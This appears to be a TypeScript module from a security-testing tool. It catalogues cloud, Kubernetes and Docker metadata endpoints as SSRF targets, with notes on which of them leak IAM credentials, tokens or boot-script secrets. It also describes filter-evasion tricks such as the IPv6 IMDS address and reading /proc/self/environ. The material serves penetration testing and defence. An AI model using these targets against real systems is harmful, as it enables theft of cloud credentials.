// Cloud metadata catalog (PLAN-KIT.md K2). One list for the Payload kit and the HTTP response
// editor's "Targets", so they can't drift apart. Read-only GETs only.
//
// header: what the endpoint insists on. A redirect can't add request headers, so only rows without
// one can be reached by redirecting an SSRF there; the rest need a fetcher that lets you set headers.

export type MetaRow = {
  id: string;
  provider: string;
  name: string;
  url: string;
  header?: string;
  note: string;
};

export const METADATA: MetaRow[] = [
  { id: "aws-v1", provider: "AWS", name: "IMDSv1: IAM role credentials", url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    note: "Lists the role name; append it to get keys. Only answers where the instance still allows IMDSv1." },
  { id: "aws-userdata", provider: "AWS", name: "IMDSv1: user data", url: "http://169.254.169.254/latest/user-data",
    note: "Boot scripts, often with secrets." },
  { id: "aws-v2", provider: "AWS", name: "IMDSv2", url: "http://169.254.169.254/latest/api/token", header: "X-aws-ec2-metadata-token",
    note: "IMDSv2 needs a PUT for a token, then the token as X-aws-ec2-metadata-token on every GET. A GET-only SSRF or a redirect gets 401: proof the service is there, nothing more." },
  { id: "aws-v6", provider: "AWS", name: "IMDS over IPv6", url: "http://[fd00:ec2::254]/latest/meta-data/",
    note: "Nitro instances with the IPv6 endpoint turned on. Same v1/v2 rules; slips past filters that only block 169.254.169.254." },
  { id: "aws-ecs", provider: "AWS", name: "ECS task metadata", url: "http://169.254.170.2/v2/metadata",
    note: "Task and container details. Credentials sit at 169.254.170.2 plus the path in AWS_CONTAINER_CREDENTIALS_RELATIVE_URI (readable through file:///proc/self/environ)." },
  { id: "aws-eks", provider: "AWS", name: "EKS Pod Identity", url: "http://169.254.170.23/v1/credentials", header: "Authorization",
    note: "The Authorization value is the token in AWS_CONTAINER_AUTHORIZATION_TOKEN_FILE, so a plain SSRF only shows it exists." },
  { id: "gcp", provider: "Google Cloud", name: "Service account token", url: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", header: "Metadata-Flavor: Google",
    note: "Also at 169.254.169.254. Requests carrying X-Forwarded-For are refused. The old header-free v1beta1 API is gone." },
  { id: "azure", provider: "Azure", name: "Instance metadata", url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01", header: "Metadata: true",
    note: "Requests carrying X-Forwarded-For are refused." },
  { id: "azure-mi", provider: "Azure", name: "Managed identity token", url: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", header: "Metadata: true",
    note: "App Service and Functions use IDENTITY_ENDPOINT with X-IDENTITY-HEADER instead." },
  { id: "alibaba", provider: "Alibaba Cloud", name: "RAM role credentials", url: "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
    note: "Lists the role name; append it. Instances in hardened (token) mode refuse header-free requests." },
  { id: "oracle-v1", provider: "Oracle Cloud", name: "IMDSv1", url: "http://169.254.169.254/opc/v1/instance/",
    note: "Legacy and often turned off; when it answers, no header is needed." },
  { id: "oracle-v2", provider: "Oracle Cloud", name: "IMDSv2", url: "http://169.254.169.254/opc/v2/instance/", header: "Authorization: Bearer Oracle",
    note: "The header is a fixed string, so a fetcher that lets you set headers gets in." },
  { id: "do", provider: "DigitalOcean", name: "Droplet metadata", url: "http://169.254.169.254/metadata/v1.json",
    note: "User data at /metadata/v1/user-data." },
  { id: "hetzner", provider: "Hetzner Cloud", name: "Server metadata", url: "http://169.254.169.254/hetzner/v1/metadata",
    note: "User data at /hetzner/v1/userdata." },
  { id: "openstack", provider: "OpenStack", name: "Instance metadata", url: "http://169.254.169.254/openstack/latest/meta_data.json",
    note: "Also the EC2-style paths under /latest/." },
  { id: "k8s", provider: "Kubernetes", name: "API server version", url: "https://kubernetes.default.svc/version",
    note: "Usually readable without a token, so it proves the SSRF reaches the cluster API; the rest needs a service account token." },
  { id: "docker", provider: "Docker", name: "Engine API", url: "http://127.0.0.1:2375/version",
    note: "Answers only where the daemon listens on TCP without TLS; /containers/json lists containers." },
];

// what a redirect can reach: no header needed
export const redirectable = (r: MetaRow) => !r.header;

export function hostOf(url: string): string {
  try { return new URL(url).hostname.replace(/^\[|\]$/g, ""); } catch { return ""; }
}
export function pathOf(url: string): string {
  try { const u = new URL(url); return u.pathname + u.search; } catch { return "/"; }
}
